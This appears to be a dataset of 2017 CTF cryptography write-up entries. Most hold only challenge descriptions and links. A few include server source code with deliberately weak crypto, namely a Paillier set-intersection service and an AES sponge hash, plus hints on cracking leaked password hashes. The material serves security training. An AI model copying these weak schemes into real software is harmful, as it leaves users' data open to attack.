{"source": "write-ups-2017", "category": "crypto", "path": "data\\write-ups-2017\\boston-key-party-2017\\crypto\\multi-party-computation-250", "year": "2017", "name": "multi-party-computation-250", "writeup": "# Boston Key Party CTF 2017: multi-party-computation-150\n\n**Category:** Crypto\n**Points:** 250\n**Solves:** \n**Description:**\n\n> (missing description)\n> \n> [mpc.py](mpc.py)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [cinsects](https://cinsects.de/boston-key-party-2017-multi-party-computation.html)\n* [greunion](http://www.rogdham.net/2017/02/27/boston-key-party-2017-write-ups.en)\n* https://gist.github.com/elliptic-shiho/d72668a375e0d681b00138a212de9a7d\n", "solution_code": "\n# mpc.py\nfrom Crypto.Util import number\nimport random\n\nfrom SocketServer import ThreadingMixIn\nfrom BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler\n\nimport sys\nimport json\n\nimport traceback\n\ndef L(x, n):\n  return (x-1) // n\n\n\ndef paillier_keygen():\n  # Returns (pk, sk)\n  p = number.getStrongPrime(512)\n  q = number.getStrongPrime(512)\n  n = p*q\n  lam = (p-1)*(q-1)/2\n  while True:\n    g = random.randrange(n**2)\n    if number.GCD(g, n) != 1:\n      continue\n    mu_inv = L(pow(g, lam, n**2), n)\n    if number.GCD(mu_inv, n) != 1:\n      continue\n    mu = number.inverse(mu_inv, n)\n    break\n  return (n, g), (lam, mu)\n\ndef paillier_encrypt((n, g), m):\n  while True:\n    r = random.randrange(n)\n    if number.GCD(r, n) == 1:\n      break\n  return (pow(g, m, n**2) * pow(r, n, n**2)) % (n**2)\n\ndef paillier_decrypt((n, g), (lam, mu), c):\n  return (L(pow(c, lam, n**2), n) * mu) % n\n\ndef paillier_add((n, g), a, b):\n  return (a * b) % (n**2)\n\ndef paillier_multiply((n, g), a, k):\n  return pow(a, k, n**2)\n\ndef mpc_monomial(point):\n  return [-point, 1]\n\ndef mpc_multiply_poly(n, x, y):\n  result = [0]*(len(x) + len(y))\n  for i in range(len(x)):\n    for j in range(len(y)):\n      result[i+j] += (result[i+j] + x[i]*y[j]) % n\n  return result\n\ndef mpc_encrypt_poly(pk, poly):\n  return [paillier_encrypt(pk, term) for term in poly]\n\ndef mpc_client_genpoly((n, g), points):\n  result = [1]\n  for point in points:\n    result = mpc_multiply_poly(n, result, mpc_monomial(point))\n  return mpc_encrypt_poly(pk, result)\n\ndef mpc_evaluate_poly((n, g), poly, point):\n  pow_point = point\n  result = poly[0]\n  for term in poly[1:]:\n    result = paillier_add((n, g), result, paillier_multiply((n, g), term, pow_point))\n    pow_point = (pow_point * point) % n\n  return result\n\ndef mpc_server_side((n, g), poly, points):\n  for point in points:\n    result = mpc_evaluate_poly((n, g), poly, point)\n    result = paillier_multiply((n, g), result, random.randrange(n))\n    result = paillier_add((n, g), result, paillier_encrypt((n, g), point))\n    yield result\n\ndef mpc_client_parseresults(pk, sk, c_points, s_points_enc):\n  s_points = [paillier_decrypt(pk, sk, point) for point in s_points_enc]\n  return set(c_points) & set(s_points)\n\n\n\nclass MpcHandler(BaseHTTPRequestHandler):\n  def do_POST(self):\n    try:\n      data_str = self.rfile.read(int(self.headers.getheader('content-length')))\n      data = json.loads(data_str)\n      n = data['n']\n      if (n < 2**64):\n        raise ValueError('too small')\n      g = data['g']\n      poly = data['poly']\n      l = list(mpc_server_side((n, g), poly, POINTS))\n      random.shuffle(l)\n      result = json.dumps(l)\n    except Exception as e:\n      self.send_response(400)\n    else:\n      self.send_response(200)\n      self.end_headers()\n      self.wfile.write(result)\n\n\nclass ThreadedHTTPServer(ThreadingMixIn, HTTPServer):\n  pass\n\nif __name__==\"__main__\":\n  assert(len(sys.argv) >= 3)\n\n  with open('FLAG.txt', 'r') as f:\n    flag = f.read()[:-1]\n  print flag\n\n  POINTS = []\n  for i in range(len(flag)):\n    POINTS.append(random.randrange(2**48) * 256)\n  POINTS.sort()\n  for i in range(len(flag)):\n    POINTS[i] += ord(flag[i])\n  print POINTS\n\n  server = ThreadedHTTPServer((sys.argv[1], int(sys.argv[2])), MpcHandler)\n  server.serve_forever()\n\n"}
{"source": "write-ups-2017", "category": "RSA", "path": "data\\write-ups-2017\\boston-key-party-2017\\crypto\\rsa-buffet-150", "year": "2017", "name": "rsa-buffet-150", "writeup": "# Boston Key Party CTF 2017: rsa-buffet-150\n\n**Category:** Crypto\n**Points:** 150\n**Solves:** 80\n**Description:**\n\n> Here's 5 encrypted files, and 10 RSA keys that they might have been encrypted\n> with. (See encrypter.py for details of the encryption format.) Decrypt any 3\n> files, and recover the key from the secret share!\n>\n> [rsa-buffet.tar.bz2](rsa-buffet.tar.bz2)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [Hackeriet](http://blog.hackeriet.no/eating-a-rsa-buffet/)\n* [Capture the Swag](https://ctf.rip/bkp2017-rsabuffet/)\n* https://gist.github.com/elliptic-shiho/5fb8e9b74abb90639def7d919dad08a9\n* <https://github.com/p4-team/ctf/tree/master/2017-02-25-bkp/rsa_buffet>\n* <https://github.com/R3dCr3sc3nt/BostonKeyParty2017/blob/master/crypto/rsa-buffet/README.md>\n* <https://chc.cs.cornell.edu/writeups/6/>\n"}
{"source": "write-ups-2017", "category": "RSA", "path": "data\\write-ups-2017\\boston-key-party-2017\\crypto\\sidh-rsa-aes128-gcm-sha256-600", "year": "2017", "name": "sidh-rsa-aes128-gcm-sha256-600", "writeup": "# Boston Key Party CTF 2017: sidh-rsa-aes128-gcm-sha256-600\n\n**Category:** Crypto\n**Points:** 600\n**Solves:** 0\n**Description:**\n\n> We kind of lost the flag to this challenge... I think someone submitted it on\n> the old version of the site though, maybe you can help us find it again?\n>\n> <https://sidh-rsa-aes128-gcm-sha256.bostonkey.party>\n>\n> update 7:10 UTC Saturday: the traffic in the pcap with 162.125.18.133 is not\n> relevant to the challenge\n>\n> [accesslog.pcap](accesslog.pcap)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [Author's Writeup](https://github.com/cstanfill/sidh-writeup)"}
{"source": "write-ups-2017", "category": "crypto", "path": "data\\write-ups-2017\\boston-key-party-2017\\crypto\\sponge-200", "year": "2017", "name": "sponge-200", "writeup": "# Boston Key Party CTF 2017: sponge-200\n\n**Category:** Crypto\n**Points:** 200\n**Solves:** 7\n**Description:**\n\n> I've written a hash function. Come up with a string that collides with \"I love\n> using sponges for crypto\".\n>\n> <http://54.202.194.91:12345>\n>\n> [hash.py](hash.py)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [The Northern Coalition](https://gist.github.com/HoLyVieR/790d19c294e138ebd9993ed029bd85ad)\n* [greunion](http://www.rogdham.net/2017/02/27/boston-key-party-2017-write-ups.en)\n* [p4](https://github.com/p4-team/ctf/tree/master/2017-02-25-bkp/sponge)\n* https://gist.github.com/elliptic-shiho/e06d961508b0e32ecd942179926e7197\n* <https://chc.cs.cornell.edu/writeups/6/>\n", "solution_code": "\n# hash.py\nfrom Crypto.Cipher import AES\nfrom SocketServer import ThreadingMixIn\nfrom BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler\nimport sys\n\nclass Hasher:\n  def __init__(self):\n    self.aes = AES.new('\\x00'*16)\n\n  def reset(self):\n    self.state = '\\x00'*16\n\n  def ingest(self, block):\n    \"\"\"Ingest a block of 10 characters \"\"\"\n    block += '\\x00'*6\n    state = \"\"\n    for i in range(16):\n      state += chr(ord(self.state[i]) ^ ord(block[i]))\n    self.state = self.aes.encrypt(state)\n\n  def final_ingest(self, block):\n    \"\"\"Call this for the final ingestion.\n\n    Calling this with a 0 length block is the same as calling it one round\n    earlier with a 10 length block.\n    \"\"\"\n    if len(block) == 10:\n      self.ingest(block)\n      self.ingest('\\x80' + '\\x00'*8 + '\\x01')\n    elif len(block) == 9:\n      self.ingest(block + '\\x81')\n    else:\n      self.ingest(block + '\\x80' + '\\x00'*(8-len(block)) + '\\x01')\n\n  def squeeze(self):\n    \"\"\"Output a block of hash information\"\"\"\n    result = self.state[:10]\n    self.state = self.aes.encrypt(self.state)\n    return result\n\n  def hash(self, s):\n    \"\"\"Hash an input of any length of bytes.  Return a 160-bit digest.\"\"\"\n    self.reset()\n    blocks = len(s) // 10\n    for i in range(blocks):\n      self.ingest(s[10*i:10*(i+1)])\n    self.final_ingest(s[blocks*10:])\n\n    return self.squeeze() + self.squeeze()\n\nclass HashHandler(BaseHTTPRequestHandler):\n  def do_GET(self):\n    if self.path in ['/favicon.ico', '/index.html']:\n      # Stop.\n      self.send_response(409)\n      return\n\n    try:\n      to_hash = self.path[1:].decode('hex')\n    except TypeError:\n      # Bad hex.\n      self.send_response(418)\n      return\n\n    if to_hash == GIVEN:\n      # Nice try.\n      self.send_response(451)\n      return\n\n    result = HASHER.hash(to_hash)\n    if result != TARGET:\n      # Wrong\n      self.send_response(400)\n      return\n    self.send_response(200)\n    self.end_headers()\n    self.wfile.write(FLAG)\n\nclass ThreadedHTTPServer(ThreadingMixIn, HTTPServer):\n  pass\n\nif __name__=='__main__':\n  assert(len(sys.argv) >= 3)\n  HASHER = Hasher()\n  with open('FLAG.txt') as f:\n    FLAG = f.read()\n  GIVEN = 'I love using sponges for crypto'\n  TARGET = HASHER.hash(GIVEN)\n  server = ThreadedHTTPServer((sys.argv[1], int(sys.argv[2])), HashHandler)\n  server.serve_forever()\n"}
{"source": "write-ups-2017", "category": "crypto", "path": "data\\write-ups-2017\\breakin-ctf-2017\\crypto\\Can-you-break-the-Feligma!", "year": "2017", "name": "Can-you-break-the-Feligma!", "writeup": "# Break In 2017 - Can you break the Feligma!\n\n\n**Category:** Crypto\n**Points:** 100\n**Solves:** 0\n**Description:**\n\n> Aalekh, after getting tired of using all the widely known encryption algorithm designed his own algorithm, known as \"Feligma\", to encrypt a secret message (really secret).\n> Now he wants to check how strong his encryption is and asks you to break the encryption. The target is to break the algorithm and find the secret key encoded by Aalekh. \n\n> The only hint he gave you is the key he used to encrypt his secret message, which is: 100003\n\n## Write-up\n\nby [ironmaniiith](https://github.com/ironmaniiith)\n\nThe two important hints that were given during the contest were:\n\n1. The key used for encryption may not work during decryption\n2. RESET_VAL and STEP need not be changed\n\nIt was given that the encrypted code obtained after encrypting the secret message with Feligma Encryption algorithm was: `)fk~y+ &y{(@ &tqn!-`\n\nThere are some points to note before actually trying to break the Feligma Encryption. These are\n\n* All the addition, subtraction and multiplication is performed over modulo 41 (TOTAL_CHARS) number space.\n* The `transform` function used in the encryption ONLY depends on the given number and the index of `CONFIG` at which it is applied\n```javascript\nfunction transform(n, idx) {\n    return (n * modExpo(KEY, idx, TOTAL_CHARS)) % TOTAL_CHARS;\n}\n```\n* The `encrypt` function performs encryption in two major operations, which are `forwardPass` and `backwardPass` and updates the `CONFIG` every time it is called.\n```javascript\nfunction encrypt(n) {\n    var aux = forwardPass(n);\n    var encrypted_code = backwardPass(aux);\n    updateConfig();\n    return encrypted_code;\n}\n``` \nThe main thing that was unknown was the `CONFIG` that was used to encrypt the original message. Also the key that was used during the encryption was given (100003). Now when you try to play with feligma using any random secret messages with a particular `CONFIG`, you may find that the same message DO NOT decrypt to the original secret message with the original KEY that is used to encrypt the message.\n\n* The CONFIG gets updated by value 1 each time the encrypt function is called, this happens in a circular manner, i.e. whenever the value at a particular index of CONFIG reaches the `TOTAL_CHARS`, which is in this case 41, it resets it's original value and increase the next index value of CONFIG. This is exactly same as the milometer of a vehicle (or if you are familiar with Enigma machine, this concept is similar to wheels used Enigma machine)\n\ni.e. \nAfter each iteration, whenever `updateConfig` function is called, `CONFIG` changes as follows (starting from say `[10, 30, 23, 37]`:\n  1. `[10, 30, 23, 37]`\n  2. `[10, 30, 23, 38]`\n  3. `[10, 30, 23, 39]`\n  4. `[10, 30, 23, 40]`\n  5. `[10, 30, 24, 0]`\n  6. `[10, 30, 24, 1]`\n  7. `[10, 30, 24, 2]`\n  8. `[10, 30, 24, 3]`\n\nand so on...\n\n* `forwardPass` and `backwardPass` function performs the complimentary operations (forwar"}
{"source": "write-ups-2017", "category": "crypto", "path": "data\\write-ups-2017\\bsidessf-ctf-2017\\crypto\\in-plain-sight-100", "year": "2017", "name": "in-plain-sight-100", "writeup": "# BSides San Francisco CTF 2017 : in-plain-sight-100\n\n**Category:** Crypto\n**Points:** 100\n**Solves:** 23\n**Description:**\n\nThis level is simple: all you have to do is decrypt some HiddenCiphertext! To make it even easier, I'll give you everything you need, except the ciphertext; you have to find that on your own!\n\nYou will need:\n\n* Algorithm: AES-256-CBC\n* Key: c086e08ad8ee0ebe7c2320099cfec9eea9a346a108570a4f6494cfe7c2a30ee1\n* IV: 0a0e176722a95a623f47fa17f02cc16a\n\n(Hint: As usual, the flag will start with 'FLAG:', so you'll know when you've found it :) )\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/ginjabenjamin/CTF/tree/master/BsidesSF/CR/in-plain-sight\n"}
{"source": "write-ups-2017", "category": "crypto", "path": "data\\write-ups-2017\\bsidessf-ctf-2017\\crypto\\root-250", "year": "2017", "name": "root-250", "writeup": "# BSides San Francisco CTF 2017 : root-250\n\n**Category:** Crypto\n**Points:** 250\n**Solves:** 23\n**Description:**\n\nOur guy inside e-corp was able to get that packet capture of their backend PKI you asked for. Unfortunately it seems they're using TLS to protect the modulus fetch. Now, I have been told that the best crackers in the world can do this in 60 minutes. Unfortunately I need someone who can do it in 60 seconds.\n\nNote: Flag does not follow the \"Flag:\" format but is recognizable\n\n\n* [e_corp_pki.pcapng](e_corp_pki.pcapng)\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/jrmdev/ctf-writeups/tree/master/bsidessf-2017/%5B%5Droot\n* https://ctf.rip/bsides-sf-ctf-2017-root-crypto-challenge/\n"}
{"source": "write-ups-2017", "category": "crypto", "path": "data\\write-ups-2017\\bsidessf-ctf-2017\\crypto\\shared-secrets-250", "year": "2017", "name": "shared-secrets-250", "writeup": "# BSides San Francisco CTF 2017 : shared-secrets-250\n\n**Category:** Crypto\n**Points:** 250\n**Solves:** 4\n**Description:**\n\nBe on the lookout for QR codes around the venue, can you figure out their secret?\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2017", "category": "Hash", "path": "data\\write-ups-2017\\bsidessf-ctf-2017\\crypto\\vhash-450", "year": "2017", "name": "vhash-450", "writeup": "# BSides San Francisco CTF 2017 : vhash-450\n\n**Category:** Crypto\n**Points:** 450\n**Solves:** 204\n**Description:**\n\n---- Due to a bug, the challenge might be easier than intended. Enjoy the free points! ----\n\nCan you gain admin access to this site?\n\n(The vhash binary is what's used for signing the cookie)\n\n<http://vhash-c6bb0e85.ctf.bsidessf.net:9292>\n\n\n* [vhash.zip](vhash.zip)\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* http://rawsec.ml/en/BSides-San-Francisco-CTF-2017-write-ups/#450-vhash-Crypto\n* https://team-nawhack.fr/2017/02/16/bsidessf-2017-vhash-bug/\n* https://github.com/R3dCr3sc3nt/BSidesSF-2017/blob/master/crypto/vhash/README.md\n"}
{"source": "write-ups-2017", "category": "Hash", "path": "data\\write-ups-2017\\bsidessf-ctf-2017\\crypto\\vhash-fixed-450", "year": "2017", "name": "vhash-fixed-450", "writeup": "# BSides San Francisco CTF 2017 : vhash-fixed-450\n\n**Category:** Crypto\n**Points:** 450\n**Solves:** 13\n**Description:**\n\nCan you gain admin access to this site?\n\n(The vhash binary is what's used for signing the cookie)\n\n<http://thenewandlessbrokenvhash.ctf.bsidessf.net:9292/>\n\n* index.php\n* vhash\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/p4-team/ctf/tree/master/2017-02-12-bsidessf/vhash\n* https://nightst0rm.net/2017/02/bsidessf-2017-baby-in-depth-writeup-challenge-vhash-fixed/\n"}
{"source": "write-ups-2017", "category": "crypto", "path": "data\\write-ups-2017\\bsidessf-ctf-2017\\misc\\the-right-cipher-1", "year": "2017", "name": "the-right-cipher-1", "writeup": "# BSides San Francisco CTF 2017 : the-right-cipher-1\n\n**Category:** Misc\n**Points:** 1\n**Solves:** 345\n**Description:**\n\nThis cipher was correctly used in TKIP\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/R3dCr3sc3nt/BSidesSF-2017/blob/master/misc/README.md\n* http://rawsec.ml/en/BSides-San-Francisco-CTF-2017-write-ups/#1-Hackers-Misc\n"}
{"source": "write-ups-2017", "category": "crypto", "path": "data\\write-ups-2017\\bsidessf-ctf-2017\\misc\\the-wrong-cipher-1", "year": "2017", "name": "the-wrong-cipher-1", "writeup": "# BSides San Francisco CTF 2017 : the-wrong-cipher-1\n\n**Category:** Misc\n**Points:** 1\n**Solves:** 367\n**Description:**\n\nThis cipher was used incorrectly in WEP\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/R3dCr3sc3nt/BSidesSF-2017/blob/master/misc/README.md\n* http://rawsec.ml/en/BSides-San-Francisco-CTF-2017-write-ups/#1-Hackers-Misc\n"}
{"source": "write-ups-2017", "category": "Hash", "path": "data\\write-ups-2017\\bsidessf-ctf-2017\\pwn\\hashecute-100", "year": "2017", "name": "hashecute-100", "writeup": "# BSides San Francisco CTF 2017 : hashecute-100\n\n**Category:** Pwn\n**Points:** 100\n**Solves:** 37\n**Description:**\n\nThe server will run any code you send it. But, there's a catch!\n\nThe flag is in /home/ctf/flag.txt\n\n    nc hashecute-9b16b5b9.ctf.bsidessf.net 2525\n\n* [hashecute.zip](hashecute.zip)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://nacayoshi00.wordpress.com/2017/02/24/bsides-san-francisco-ctf-writeup/\n"}
{"source": "write-ups-2017", "category": "crypto", "path": "data\\write-ups-2017\\hack-dat-kiwi-ctf-2017\\crypto\\ps1-100", "year": "2017", "name": "ps1-100", "writeup": "# Hack Dat Kiwi 2017 : PS1\n\n**Category:** Crypto\n**Points:** 100\n**Solves:**\n**Description:**\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [OH-IOwned](https://github.com/oh-iowned/ctf-writeups/tree/master/2017/hack-dat-kiwi/ps1)\n"}
{"source": "write-ups-2017", "category": "crypto", "path": "data\\write-ups-2017\\hack-dat-kiwi-ctf-2017\\crypto\\ps2-100", "year": "2017", "name": "ps2-100", "writeup": "# Hack Dat Kiwi 2017 : PS2\n\n**Category:** Crypto\n**Points:** 100\n**Solves:**\n**Description:**\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [OH-IOwned](https://github.com/oh-iowned/ctf-writeups/tree/master/2017/hack-dat-kiwi/ps2)\n"}
{"source": "write-ups-2017", "category": "crypto", "path": "data\\write-ups-2017\\hack-dat-kiwi-ctf-2017\\crypto\\ps4-120", "year": "2017", "name": "ps4-120", "writeup": "# Hack Dat Kiwi 2017 : PS4\n\n**Category:** Crypto\n**Points:** 120\n**Solves:**\n**Description:**\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [OH-IOwned](https://github.com/oh-iowned/ctf-writeups/tree/master/2017/hack-dat-kiwi/ps4)\n"}
{"source": "write-ups-2017", "category": "Hash", "path": "data\\write-ups-2017\\hack-dat-kiwi-ctf-2017\\web\\hasher-100", "year": "2017", "name": "hasher-100", "writeup": "# Hack Dat Kiwi 2017 : Hasher\n\n**Category:** Web\n**Points:** 100\n**Solves:**\n**Description:**\n\n> There's this system that has a hardcoded admin user/password, in a way that can not be brute forced or cracked. We desperately need to acquire access to this system, can you help us?\n> Note: Source code inside challenge\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [Fox-Hound](https://github.com/soolidsnake/Write-ups/tree/master/Kiwi_CTF/Hasher)\n* [rawsec](https://rawsec.ml/en/HackDatKiwi-2017-write-ups/#100-hasher-web)\n"}
{"source": "write-ups-2017", "category": "crypto", "path": "data\\write-ups-2017\\insomnihack-teaser-2017\\crypto\\cryptoquizz-50", "year": "2017", "name": "cryptoquizz-50", "writeup": "# Insomni'hack Teaser 2017 : cryptoquizz-50\n\n**Category:** Crypto\n**Points:** 50\n**Solves:** 280\n**Description:**\n\nHello, young hacker. Are you ready to fight rogue machines ? Now, you'll have to prove us that you are a genuine cryptographer.\nRunning on <quizz.teaser.insomnihack.ch:1031>\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/polydragoncez/CTF-write-up/tree/master/Insomni'hack%20teaser%202017/Misc50\n* http://pastebin.com/G285861d\n* http://matthieukeller.com/2017/01/insomnihack-teaser-2017.html#cryptoquizz\n* https://r3xnation.wordpress.com/2017/01/23/insomnihack-17-cryptoquizz/\n* https://github.com/tahaSuleyman/InsomnihackTeaser2017-cryptoquizz.git\n* http://rawsec.ml/en/Insomnihack-2017-Teaser-cryptoquizz/\n* https://github.com/p4-team/ctf/tree/master/2017-01-21-insomnihack/cryptoquizz\n* https://github.com/grrr83/Insomni-hack-teaser-2017/tree/master/cryptoquizz#cryptoquizz\n* http://dann.com.br/ins17-insominihack-crypto50-cryptoquizz/\n* https://github.com/ChalmersCTF/Writeups/tree/master/Insomnihack_teaser_2017/cryptoquiz\n"}
{"source": "write-ups-2017", "category": "crypto", "path": "data\\write-ups-2017\\insomnihack-teaser-2017\\crypto\\encryptor-400", "year": "2017", "name": "encryptor-400", "writeup": "# Insomni'hack Teaser 2017 : encryptor-400\n\n**Category:** Crypto\n**Points:** 400\n**Solves:** 1\n**Description:**\n\nWe need your skillz because one G**gle car has become mad and tries to kill as many pedestrians as possible. Fortunately, we have recovered an encryptor that it uses to protect its firmware thanks to a master key of type INS{...}. Please help us, implement the corresponding decryptor and recover the master key that can be found in the provided ciphertext.\nChallenge file [here](encryptor.tgz)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2017", "category": "crypto", "path": "data\\write-ups-2017\\kpmg-malaysia-ctf-2017\\CipherFromHell-150", "year": "2017", "name": "CipherFromHell-150", "writeup": "# KPMG Malaysia CTF 2017 : The Cipher from hell\n\n**Points:** 150\n**Description:**\n\n(TODO)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* (TODO)", "solution_code": "\n# enc.py\n#!/usr/bin/env python2\n\nm = open(\"message\").read()\nk = \"key: 123\".strip()\ndef gg(m, k):\n    z = \"\"\n    for i, c in enumerate(m):\n        z += chr((ord(c)+ord(k[i%len(k)]))%256)\n\n    print(z)\n    return z\nf = open(\"cipher\", \"wb\")\nf.write(gg(m, k))\nf.close()\n\n\n"}
{"source": "write-ups-2017", "category": "crypto", "path": "data\\write-ups-2017\\nullcon-hackim-2017\\crypto\\crypto-question1-300", "year": "2017", "name": "crypto-question1-300", "writeup": "# nullcon HackIM 2017 : crypto-question1-300\n\n**Category:** Crypto\n**Points:** 300\n**Solves:**\n**Description:**\n\nBreaking Brain\n\n[cryptopuzzle1.png](cryptopuzzle1.png)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://team-nawhack.fr/2017/02/14/nullcon-hackim-2017-crypto1/\n* https://warrenpaulus.wordpress.com/2017/02/24/nullcon-hackim-2017-crypto-1/\n* https://atomheartother.github.io/cybersecurity/2017/02/12/NullCrypto.html\n* https://0day.work/nullcon-hackim-crypto-1-writeup/\n"}
{"source": "write-ups-2017", "category": "crypto", "path": "data\\write-ups-2017\\nullcon-hackim-2017\\crypto\\crypto-question2-350", "year": "2017", "name": "crypto-question2-350", "writeup": "# nullcon HackIM 2017 : crypto-question2-350\n\n**Category:** Crypto\n**Points:** 350\n**Solves:**\n**Description:**\n\nBreaking Bad Key Exchange\n\nHint 1 : in the range (1 to gq), there are couple of pairs yielding common secrete as 399.\nHint 2 : 'a' and 'b' both are less than 1000\n\nFlag Format: flag{a,b}\n\n[cryptopuzzle2.png](cryptopuzzle2.png)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://meem67.github.io/blog/2017-02-12/nullcon_writeups.html#Crypto2\n* http://thu11d3r.blogspot.com/2017/02/nullcon-ctf2017.html\n* https://github.com/ChalmersCTF/Writeups/tree/master/Nullcon_2017/Crypto2\n* https://ctf.rip/hackim-breaking-bad-key-exchange-crypto-challenge/\n"}
{"source": "write-ups-2017", "category": "crypto", "path": "data\\write-ups-2017\\nullcon-hackim-2017\\crypto\\crypto-question3-200", "year": "2017", "name": "crypto-question3-200", "writeup": "# nullcon HackIM 2017 : crypto-question3-200\n\n**Category:** Crypto\n**Points:** 200\n**Solves:**\n**Description:**\n\nBreaking Brands!\n\n[image.png](image.png)\n\n[next-setp.tar.gz](next-setp.tar.gz)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://www.prebreza.com/post/17/02/crypto3-nullcon-ctf-writeup/\n* https://atomheartother.github.io/cybersecurity/2017/02/12/NullCrypto.html#NStep\n* https://github.com/Ne0Lux-C1Ph3r/WRITE-UP/blob/master/Nullcon_HackIM/cryptopuzzle3.md\n"}
{"source": "write-ups-2017", "category": "AES", "path": "data\\write-ups-2017\\picoctf-2017\\cryptography\\compute-aes-50", "year": "2017", "name": "compute-aes-50", "writeup": "# picoCTF 2017 : compute-aes-50\n\n**Category:** Cryptography\n**Points:** 50\n**Solves:**\n**Description:**\n\n> You found this clue laying around. Can you decrypt it?\n>\n>  HINTS\n>\n> Try online tools or python\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2017", "category": "RSA", "path": "data\\write-ups-2017\\picoctf-2017\\cryptography\\compute-rsa-50", "year": "2017", "name": "compute-rsa-50", "writeup": "# picoCTF 2017 : compute-rsa-50\n\n**Category:** Cryptography\n**Points:** 50\n**Solves:**\n**Description:**\n\n> RSA encryption/decryption is based on a formula that anyone can find and use, as long as they know the values to plug in. Given the encrypted number 150815, d = 1941, and N = 435979, what is the decrypted number?\n>\n>\n>  HINTS\n>\n> decrypted = (encrypted) ^ d mod N\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2017", "category": "Hash", "path": "data\\write-ups-2017\\picoctf-2017\\cryptography\\hash101-50", "year": "2017", "name": "hash101-50", "writeup": "# picoCTF 2017 : hash101-50\n\n**Category:** Cryptography\n**Points:** 50\n**Solves:**\n**Description:**\n\n> Prove your knowledge of hashes and claim a flag as your prize! Connect to the service at shell2017.picoctf.com:9661\n>\n> UPDATED 16:12 EST 1 Apr.\n>\n>\n>  HINTS\n>\n> All concepts required to complete this challenge, including simple modular math, are quickly found by googling :)\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2017", "category": "crypto", "path": "data\\write-ups-2017\\picoctf-2017\\cryptography\\keyz-20", "year": "2017", "name": "keyz-20", "writeup": "# picoCTF 2017 : keyz-20\n\n**Category:** Cryptography\n**Points:** 20\n**Solves:**\n**Description:**\n\n> While webshells are nice, it'd be nice to be able to login directly. To do so, please add your own public key to ~/.ssh/authorized_keys, using the webshell. Make sure to copy it correctly! The key is in the ssh banner, displayed when you login remotely with ssh, to shell2017.picoctf.com\n>\n>\n>  HINTS\n>\n> There are plenty of tutorials out there. This one covers key generation: <https://confluence.atlassian.com/bitbucketserver/creating-ssh-keys-776639788.html>\n>\n> Then, use the web shell to copy/paste it, and use the appropriate tool to ssh to the server using your key\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2017", "category": "Hash", "path": "data\\write-ups-2017\\picoctf-2017\\cryptography\\leaked-hashes-90", "year": "2017", "name": "leaked-hashes-90", "writeup": "# picoCTF 2017 : leaked-hashes-90\n\n**Category:** Cryptography\n**Points:** 90\n**Solves:**\n**Description:**\n\n> Someone got hacked! Check out some service's password hashes that were leaked at hashdump.txt! Do you think they chose strong passwords? We should check... The service is running at shell2017.picoctf.com:3815!\n>\n>\n>  HINTS\n>\n> See if you can crack any of the login credentials and then connect to the service as one of the users. What's the chance these hashes have actually already been broken by someone else? Are there websites that host those cracked hashes? Connect from the shell with nc.\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2017", "category": "crypto", "path": "data\\write-ups-2017\\picoctf-2017\\cryptography\\so-random-75", "year": "2017", "name": "so-random-75", "writeup": "# picoCTF 2017 : so-random-75\n\n**Category:** Cryptography\n**Points:** 75\n**Solves:** \n**Description:**\n\n> We found sorandom.py running at shell2017.picoctf.com:33123. It seems to be outputting the flag but randomizing all the characters first. Is there anyway to get back the original flag?\n> \n> Update (text only) 16:16 EST 1 Apr Running python 2 (same version as on the server)\n> \n> \n>  HINTS\n> \n> How random can computers be?\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2017", "category": "crypto", "path": "data\\write-ups-2017\\picoctf-2017\\cryptography\\substitute-40", "year": "2017", "name": "substitute-40", "writeup": "# picoCTF 2017 : substitute-40\n\n**Category:** Cryptography\n**Points:** 40\n**Solves:** \n**Description:**\n\n> A wizard (he seemed kinda odd...) handed me this. Can you figure out what it says?\n> \n> \n>  HINTS\n> \n> There are tools that make this easy this.\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
